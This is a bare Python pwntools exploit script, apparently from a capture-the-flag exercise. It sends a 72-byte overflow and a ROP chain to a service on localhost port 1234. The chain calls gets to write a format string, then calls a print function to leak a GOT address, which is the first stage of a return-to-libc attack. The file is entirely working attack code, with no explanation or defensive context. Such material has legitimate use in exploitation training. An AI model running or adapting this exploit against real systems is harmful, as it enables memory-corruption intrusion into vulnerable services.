from pwn import *

pwn = remote('127.0.0.1',1234)

pop_rdi_ret_addr = 0x0000000000400763
pop_rsi_r15_ret_addr = 0x0000000000400761
print_addr = 0x0000000000400510
data_addr = 0x00000000006008F8
gets_addr = 0x0000000000400540
vuln_addr = 0x0000000000400656

payload = ''

payload += 'A'*72
payload += p64(pop_rdi_ret_addr)
payload += p64(data_addr)
payload += p64(gets_addr)
payload += p64(vuln_addr)

pwn.sendline(payload)
pwn.recvuntil('\n')
pwn.sendline("%s")

payload = 'A'*72
payload += p64(pop_rdi_ret_addr)
payload += p64(data_addr)
payload += p64(pop_rsi_r15_ret_addr)
payload += p64(0x0000000000600B08)
payload += p64(0x1234)
payload += p64(print_addr)

pwn.sendline(payload)
pwn.recvuntil('\n')
data = pwn.recv(8)
gets_got_addr = u64(data+'\x00'*(8-len(data)))

print gets_got_addr